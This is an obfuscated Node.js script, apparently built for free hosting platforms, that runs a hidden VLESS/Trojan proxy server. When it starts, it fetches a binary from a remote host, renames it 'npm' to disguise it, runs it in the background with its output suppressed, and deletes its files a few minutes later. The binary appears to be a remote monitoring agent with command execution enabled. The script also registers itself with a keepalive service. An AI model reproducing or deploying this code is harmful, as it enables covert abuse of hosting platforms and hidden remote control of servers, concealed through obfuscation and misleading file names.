const _0x329483=_0x17f7;(function(_0x4b5483,_0x37013f){const _0x36706a=_0x17f7,_0x368e90=_0x4b5483();while(!![]){try{const _0x1d176a=-parseInt(_0x36706a(0x19e))/0x1*(-parseInt(_0x36706a(0x1f7))/0x2)+-parseInt(_0x36706a(0x204))/0x3*(-parseInt(_0x36706a(0x216))/0x4)+-parseInt(_0x36706a(0x1dc))/0x5+parseInt(_0x36706a(0x1e4))/0x6*(-parseInt(_0x36706a(0x1af))/0x7)+-parseInt(_0x36706a(0x208))/0x8*(parseInt(_0x36706a(0x20d))/0x9)+parseInt(_0x36706a(0x1d6))/0xa+-parseInt(_0x36706a(0x203))/0xb*(-parseInt(_0x36706a(0x1b6))/0xc);if(_0x1d176a===_0x37013f)break;else _0x368e90['push'](_0x368e90['shift']());}catch(_0x528e3e){_0x368e90['push'](_0x368e90['shift']());}}}(_0xf671,0x3afa3));function _0x17f7(_0x5f3c35,_0x721cf6){const _0xf671dd=_0xf671();return _0x17f7=function(_0x17f7ff,_0x4e2009){_0x17f7ff=_0x17f7ff-0x19d;let _0x1ea064=_0xf671dd[_0x17f7ff];return _0x1ea064;},_0x17f7(_0x5f3c35,_0x721cf6);}const os=require('os'),http=require(_0x329483(0x1c6)),fs=require('fs'),axios=require(_0x329483(0x1ac)),net=require('net'),path=require(_0x329483(0x1ef)),crypto=require(_0x329483(0x1d8)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x329483(0x1c4)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x329483(0x1e3)]||_0x329483(0x1c3),NEZHA_SERVER=process[_0x329483(0x1f0)][_0x329483(0x20e)]||'',NEZHA_PORT=process['env'][_0x329483(0x1c1)]||'',NEZHA_KEY=process[_0x329483(0x1f0)][_0x329483(0x1b5)]||'',DOMAIN=process[_0x329483(0x1f0)][_0x329483(0x1ab)]||'1234.abc.com',AUTO_ACCESS=process['env'][_0x329483(0x1db)]||!![],WSPATH=process[_0x329483(0x1f0)][_0x329483(0x19d)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x329483(0x215)]||_0x329483(0x1e7),NAME=process[_0x329483(0x1f0)][_0x329483(0x21b)]||'Hug',PORT=process[_0x329483(0x1f0)][_0x329483(0x206)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2038e1=_0x329483;try{const _0x5a6283=await axios[_0x2038e1(0x1cb)](_0x2038e1(0x1be)),_0x29a4e1=_0x5a6283[_0x2038e1(0x1a7)];ISP=(_0x29a4e1['country']+'-'+_0x29a4e1[_0x2038e1(0x1f6)])['replace'](/ /g,'_');}catch(_0x2bf589){ISP=_0x2038e1(0x1d0);}};GetISP();const httpServer=http[_0x329483(0x1a8)]((_0x304d9b,_0x5045f4)=>{const _0x4fc00a=_0x329483;if(_0x304d9b['url']==='/'){const _0xd270aa=path[_0x4fc00a(0x1a1)](__dirname,_0x4fc00a(0x1f4));fs[_0x4fc00a(0x202)](_0xd270aa,_0x4fc00a(0x20c),(_0x4df3b3,_0x3cd589)=>{const _0x158f5b=_0x4fc00a;if(_0x4df3b3){_0x5045f4['writeHead'](0xc8,{'Content-Type':_0x158f5b(0x207)}),_0x5045f4[_0x158f5b(0x1c2)](_0x158f5b(0x1e9));return;}_0x5045f4['writeHead'](0xc8,{'Content-Type':_0x158f5b(0x207)}),_0x5045f4[_0x158f5b(0x1c2)](_0x3cd589);});return;}else{if(_0x304d9b[_0x4fc00a(0x1ca)]==='/'+SUB_PATH){const _0x308458=_0x4fc00a(0x219)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4fc00a(0x1a3)+DOMAIN+_0x4fc00a(0x1fc)+WSPATH+'#'+NAME+'-'+ISP,_0x52a02f=_0x4fc00a(0x1cf)+UUID+'@'+DOMAIN+_0x4fc00a(0x1a2)+DOMAIN+_0x4fc00a(0x1a3)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x464f31=_0x308458+'\x0a'+_0x52a02f,_0x5f34e0=Buffer[_0x4fc00a(0x1cd)](_0x464f31)['toString'](_0x4fc00a(0x1ec));_0x5045f4[_0x4fc00a(0x214)](0xc8,{'Content-Type':'text/plain'}),_0x5045f4[_0x4fc00a(0x1c2)](_0x5f34e0+'\x0a');}else _0x5045f4[_0x4fc00a(0x214)](0x194,{'Content-Type':_0x4fc00a(0x1c7)}),_0x5045f4['end'](_0x4fc00a(0x1da));}}),wss=new WebSocket[(_0x329483(0x1f5))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x329483(0x1d3),_0x329483(0x1fa)];function resolveHost(_0x46709a){return new Promise((_0x61bcae,_0x3b4192)=>{const _0x3b2da2=_0x17f7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3b2da2(0x1fb)](_0x46709a)){_0x61bcae(_0x46709a);return;}let _0x5afc03=0x0;function _0xea3e7a(){const _0x423751=_0x3b2da2;if(_0x5afc03>=DNS_SERVERS['length']){_0x3b4192(new Error('Failed\x20to\x20resolve\x20'+_0x46709a+_0x423751(0x1cc)));return;}const _0x4fd1fa=DNS_SERVERS[_0x5afc03];_0x5afc03++;const _0x112c3e=_0x423751(0x1c5)+encodeURIComponent(_0x46709a)+'&type=A';axios[_0x423751(0x1cb)](_0x112c3e,{'timeout':0x1388,'headers':{'Accept':_0x423751(0x217)}})[_0x423751(0x1e1)](_0x5f522b=>{const _0x5d4563=_0x423751,_0x195d2e=_0x5f522b[_0x5d4563(0x1a7)];if(_0x195d2e[_0x5d4563(0x1b3)]===0x0&&_0x195d2e[_0x5d4563(0x1f2)]&&_0x195d2e[_0x5d4563(0x1f2)][_0x5d4563(0x1ff)]>0x0){const _0x2740ec=_0x195d2e['Answer'][_0x5d4563(0x1bc)](_0x23ebd6=>_0x23ebd6['type']===0x1);if(_0x2740ec){_0x61bcae(_0x2740ec[_0x5d4563(0x1a7)]);return;}}_0xea3e7a();})['catch'](_0x3ab603=>{_0xea3e7a();});}_0xea3e7a();});}function handleVlessConnection(_0x1b44bd,_0x461cab){const _0x8f6e4=_0x329483,[_0x12ce05]=_0x461cab,_0x56f3f9=_0x461cab[_0x8f6e4(0x1e5)](0x1,0x11);if(!_0x56f3f9[_0x8f6e4(0x1dd)]((_0x42352d,_0x1fcbae)=>_0x42352d==parseInt(uuid[_0x8f6e4(0x1ad)](_0x1fcbae*0x2,0x2),0x10)))return![];let _0x4455b5=_0x461cab[_0x8f6e4(0x1e5)](0x11,0x12)[_0x8f6e4(0x20a)]()+0x13;const _0x5253a4=_0x461cab[_0x8f6e4(0x1e5)](_0x4455b5,_0x4455b5+=0x2)[_0x8f6e4(0x1a0)](0x0),_0x196787=_0x461cab[_0x8f6e4(0x1e5)](_0x4455b5,_0x4455b5+=0x1)[_0x8f6e4(0x20a)](),_0x368322=_0x196787==0x1?_0x461cab[_0x8f6e4(0x1e5)](_0x4455b5,_0x4455b5+=0x4)[_0x8f6e4(0x1a1)]('.'):_0x196787==0x2?new TextDecoder()[_0x8f6e4(0x1b8)](_0x461cab[_0x8f6e4(0x1e5)](_0x4455b5+0x1,_0x4455b5+=0x1+_0x461cab[_0x8f6e4(0x1e5)](_0x4455b5,_0x4455b5+0x1)[_0x8f6e4(0x20a)]())):_0x196787==0x3?_0x461cab[_0x8f6e4(0x1e5)](_0x4455b5,_0x4455b5+=0x10)[_0x8f6e4(0x200)]((_0x4b3ba5,_0x302399,_0x2736dc,_0x105ed8)=>_0x2736dc%0x2?_0x4b3ba5['concat'](_0x105ed8[_0x8f6e4(0x1e5)](_0x2736dc-0x1,_0x2736dc+0x1)):_0x4b3ba5,[])[_0x8f6e4(0x1fd)](_0x58b541=>_0x58b541[_0x8f6e4(0x1a0)](0x0)['toString'](0x10))[_0x8f6e4(0x1a1)](':'):'';_0x1b44bd[_0x8f6e4(0x1aa)](new Uint8Array([_0x12ce05,0x0]));const _0x195066=createWebSocketStream(_0x1b44bd);return resolveHost(_0x368322)[_0x8f6e4(0x1e1)](_0x2d7927=>{const _0x5cb7e5=_0x8f6e4;net[_0x5cb7e5(0x1d5)]({'host':_0x2d7927,'port':_0x5253a4},function(){const _0x2b69d0=_0x5cb7e5;this[_0x2b69d0(0x1e0)](_0x461cab[_0x2b69d0(0x1e5)](_0x4455b5)),_0x195066['on'](_0x2b69d0(0x20f),()=>{})[_0x2b69d0(0x21c)](this)['on'](_0x2b69d0(0x20f),()=>{})[_0x2b69d0(0x21c)](_0x195066);})['on'](_0x5cb7e5(0x20f),()=>{});})[_0x8f6e4(0x1c8)](_0x9c4dfd=>{const _0x34f84d=_0x8f6e4;net[_0x34f84d(0x1d5)]({'host':_0x368322,'port':_0x5253a4},function(){const _0x251ec7=_0x34f84d;this[_0x251ec7(0x1e0)](_0x461cab['slice'](_0x4455b5)),_0x195066['on'](_0x251ec7(0x20f),()=>{})[_0x251ec7(0x21c)](this)['on'](_0x251ec7(0x20f),()=>{})['pipe'](_0x195066);})['on'](_0x34f84d(0x20f),()=>{});}),!![];}function _0xf671(){const _0x2e6661=['\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','createServer','application/json','send','DOMAIN','axios','substr','https://oooo.serv00.net/add-url','73577dEoKwG','once','https://amd64.ssss.nyc.mn/v1','2053','Status','arm64','NEZHA_KEY','87468sOkeZZ','sha224','decode','writeFileSync','npm\x20running\x20error:','split','find','--tls','https://speed.cloudflare.com/meta','aarch64','post','NEZHA_PORT','end','d8b2d37b-3b74-4c20-b808-279fece7e576','child_process','https://dns.google/resolve?name=','http','text/plain','catch','npm\x20is\x20running','url','get','\x20with\x20all\x20DNS\x20servers','from','npm\x20is\x20already\x20running,\x20skip\x20running...','trojan://','Unknown','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','finish','8.8.4.4','pop','connect','2172210lIDzLq','concat','crypto','createWriteStream','Not\x20Found\x0a','AUTO_ACCESS','1917660xbixRI','every','config.yaml','listen','write','then','https://arm64.ssss.nyc.mn/v1','UUID','246PNQccl','slice','npm\x20download\x20successfully','sub','setsid\x20nohup\x20./npm\x20-s\x20','Hello\x20world!','2087','hex','base64','includes','toString','path','env','log','Answer','connection','index.html','Server','asOrganization','6cHgwpV','close','https://amd64.ssss.nyc.mn/agent','1.1.1.1','test','&path=%2F','map','error:\x20','length','reduce','arm','readFile','550LMKwdE','3xAdrAh','arch','PORT','text/html','72SUaAaJ','Server\x20is\x20running\x20on\x20port\x20','readUInt8','2096','utf8','115065OLUQlB','NEZHA_SERVER','error','443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm','true','writeHead','SUB_PATH','1094300VqUQcF','application/dns-json','2083','vless://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NAME','pipe','WSPATH','105291tCrKjB','chmod\x20+x\x20npm','readUInt16BE','join',':443?security=tls&sni=','&fp=chrome&type=ws&host=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20-p\x20'];_0xf671=function(){return _0x2e6661;};return _0xf671();}function handleTrojanConnection(_0x146b54,_0xfd29e){const _0x3329c6=_0x329483;try{if(_0xfd29e[_0x3329c6(0x1ff)]<0x3a)return![];const _0xd163be=_0xfd29e['slice'](0x0,0x38)[_0x3329c6(0x1ee)](),_0x591416=[UUID];let _0x3141c9=null;for(const _0x4ed7d6 of _0x591416){const _0x105e9b=crypto['createHash'](_0x3329c6(0x1b7))['update'](_0x4ed7d6)['digest'](_0x3329c6(0x1eb));if(_0x105e9b===_0xd163be){_0x3141c9=_0x4ed7d6;break;}}if(!_0x3141c9)return![];let _0x1a20ab=0x38;_0xfd29e[_0x1a20ab]===0xd&&_0xfd29e[_0x1a20ab+0x1]===0xa&&(_0x1a20ab+=0x2);const _0x4b6920=_0xfd29e[_0x1a20ab];if(_0x4b6920!==0x1)return![];_0x1a20ab+=0x1;const _0x1d814c=_0xfd29e[_0x1a20ab];_0x1a20ab+=0x1;let _0x5a60bd,_0xee5603;if(_0x1d814c===0x1)_0x5a60bd=_0xfd29e[_0x3329c6(0x1e5)](_0x1a20ab,_0x1a20ab+0x4)[_0x3329c6(0x1a1)]('.'),_0x1a20ab+=0x4;else{if(_0x1d814c===0x3){const _0x1c6f55=_0xfd29e[_0x1a20ab];_0x1a20ab+=0x1,_0x5a60bd=_0xfd29e['slice'](_0x1a20ab,_0x1a20ab+_0x1c6f55)['toString'](),_0x1a20ab+=_0x1c6f55;}else{if(_0x1d814c===0x4)_0x5a60bd=_0xfd29e[_0x3329c6(0x1e5)](_0x1a20ab,_0x1a20ab+0x10)['reduce']((_0x39124f,_0x5d90e2,_0x3445aa,_0x36dedb)=>_0x3445aa%0x2?_0x39124f[_0x3329c6(0x1d7)](_0x36dedb['slice'](_0x3445aa-0x1,_0x3445aa+0x1)):_0x39124f,[])[_0x3329c6(0x1fd)](_0x12edae=>_0x12edae[_0x3329c6(0x1a0)](0x0)['toString'](0x10))[_0x3329c6(0x1a1)](':'),_0x1a20ab+=0x10;else return![];}}_0xee5603=_0xfd29e[_0x3329c6(0x1a0)](_0x1a20ab),_0x1a20ab+=0x2;_0x1a20ab<_0xfd29e[_0x3329c6(0x1ff)]&&_0xfd29e[_0x1a20ab]===0xd&&_0xfd29e[_0x1a20ab+0x1]===0xa&&(_0x1a20ab+=0x2);const _0x5e2ee5=createWebSocketStream(_0x146b54);return resolveHost(_0x5a60bd)[_0x3329c6(0x1e1)](_0x3b70f8=>{const _0x2730f5=_0x3329c6;net[_0x2730f5(0x1d5)]({'host':_0x3b70f8,'port':_0xee5603},function(){const _0x46c2c1=_0x2730f5;_0x1a20ab<_0xfd29e[_0x46c2c1(0x1ff)]&&this[_0x46c2c1(0x1e0)](_0xfd29e[_0x46c2c1(0x1e5)](_0x1a20ab)),_0x5e2ee5['on'](_0x46c2c1(0x20f),()=>{})[_0x46c2c1(0x21c)](this)['on'](_0x46c2c1(0x20f),()=>{})[_0x46c2c1(0x21c)](_0x5e2ee5);})['on'](_0x2730f5(0x20f),()=>{});})[_0x3329c6(0x1c8)](_0x162c0b=>{const _0x46098b=_0x3329c6;net[_0x46098b(0x1d5)]({'host':_0x5a60bd,'port':_0xee5603},function(){const _0x1e3ff8=_0x46098b;_0x1a20ab<_0xfd29e[_0x1e3ff8(0x1ff)]&&this[_0x1e3ff8(0x1e0)](_0xfd29e['slice'](_0x1a20ab)),_0x5e2ee5['on'](_0x1e3ff8(0x20f),()=>{})[_0x1e3ff8(0x21c)](this)['on'](_0x1e3ff8(0x20f),()=>{})['pipe'](_0x5e2ee5);})['on'](_0x46098b(0x20f),()=>{});}),!![];}catch(_0x1263a0){return![];}}wss['on'](_0x329483(0x1f3),(_0x1f6149,_0x59f8be)=>{const _0x2a4e47=_0x329483,_0x491fd3=_0x59f8be['url']||'';_0x1f6149[_0x2a4e47(0x1b0)]('message',_0x198ba0=>{const _0x61b2da=_0x2a4e47;if(_0x198ba0[_0x61b2da(0x1ff)]>0x11&&_0x198ba0[0x0]===0x0){const _0x248aa5=_0x198ba0[_0x61b2da(0x1e5)](0x1,0x11),_0xa1a20b=_0x248aa5[_0x61b2da(0x1dd)]((_0x404499,_0x578cc0)=>_0x404499==parseInt(uuid[_0x61b2da(0x1ad)](_0x578cc0*0x2,0x2),0x10));if(_0xa1a20b){!handleVlessConnection(_0x1f6149,_0x198ba0)&&_0x1f6149[_0x61b2da(0x1f8)]();return;}}!handleTrojanConnection(_0x1f6149,_0x198ba0)&&_0x1f6149[_0x61b2da(0x1f8)]();})['on'](_0x2a4e47(0x20f),()=>{});});const getDownloadUrl=()=>{const _0x2c07ef=_0x329483,_0xeffe1e=os[_0x2c07ef(0x205)]();return _0xeffe1e===_0x2c07ef(0x201)||_0xeffe1e===_0x2c07ef(0x1b4)||_0xeffe1e===_0x2c07ef(0x1bf)?!NEZHA_PORT?_0x2c07ef(0x1e2):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x2c07ef(0x1b1):_0x2c07ef(0x1f9);},downloadFile=async()=>{const _0x5b0b0b=_0x329483;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2def87=getDownloadUrl(),_0x43688a=await axios({'method':'get','url':_0x2def87,'responseType':'stream'}),_0x4e661f=fs[_0x5b0b0b(0x1d9)](_0x5b0b0b(0x212));return _0x43688a[_0x5b0b0b(0x1a7)][_0x5b0b0b(0x21c)](_0x4e661f),new Promise((_0xb0339a,_0xe921f9)=>{const _0x13b25c=_0x5b0b0b;_0x4e661f['on'](_0x13b25c(0x1d2),()=>{const _0x14322d=_0x13b25c;console[_0x14322d(0x1f1)](_0x14322d(0x1e6)),exec(_0x14322d(0x19f),_0x22b3a0=>{if(_0x22b3a0)_0xe921f9(_0x22b3a0);_0xb0339a();});}),_0x4e661f['on'](_0x13b25c(0x20f),_0xe921f9);});}catch(_0x5e5d3e){throw _0x5e5d3e;}},runnz=async()=>{const _0x41334b=_0x329483;try{const _0x185906=execSync(_0x41334b(0x21a),{'encoding':'utf-8'});if(_0x185906['trim']()!==''){console['log'](_0x41334b(0x1ce));return;}}catch(_0x7fe84b){}await downloadFile();let _0xef3ba0='',_0x11fff6=[_0x41334b(0x210),'8443',_0x41334b(0x20b),_0x41334b(0x1ea),_0x41334b(0x218),_0x41334b(0x1b2)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x275884=_0x11fff6[_0x41334b(0x1ed)](NEZHA_PORT)?_0x41334b(0x1bd):'';_0xef3ba0=_0x41334b(0x1e8)+NEZHA_SERVER+':'+NEZHA_PORT+_0x41334b(0x1a5)+NEZHA_KEY+'\x20'+_0x275884+_0x41334b(0x1d1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4487f1=NEZHA_SERVER[_0x41334b(0x1ed)](':')?NEZHA_SERVER[_0x41334b(0x1bb)](':')[_0x41334b(0x1d4)]():'',_0x1cb18c=_0x11fff6[_0x41334b(0x1ed)](_0x4487f1)?_0x41334b(0x213):'false',_0x4998d7='client_secret:\x20'+NEZHA_KEY+_0x41334b(0x211)+NEZHA_SERVER+_0x41334b(0x1a6)+_0x1cb18c+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x41334b(0x1b9)](_0x41334b(0x1de),_0x4998d7);}_0xef3ba0='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x41334b(0x1f1)](_0x41334b(0x1a4));return;}}try{exec(_0xef3ba0,{'shell':'/bin/bash'},_0x4c4bcb=>{const _0x51066e=_0x41334b;if(_0x4c4bcb)console[_0x51066e(0x20f)](_0x51066e(0x1ba),_0x4c4bcb);else console['log'](_0x51066e(0x1c9));});}catch(_0x1aea12){console[_0x41334b(0x20f)](_0x41334b(0x1fe)+_0x1aea12);}};async function addAccessTask(){const _0x501f7f=_0x329483;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5727d2='https://'+DOMAIN;try{const _0x5823ab=await axios[_0x501f7f(0x1c0)](_0x501f7f(0x1ae),{'url':_0x5727d2},{'headers':{'Content-Type':_0x501f7f(0x1a9)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x206b32){}}const delFiles=()=>{const _0x18fc93=_0x329483;fs['unlink'](_0x18fc93(0x212),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x329483(0x1df)](PORT,()=>{const _0x4cb987=_0x329483;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4cb987(0x1f1)](_0x4cb987(0x209)+PORT);});
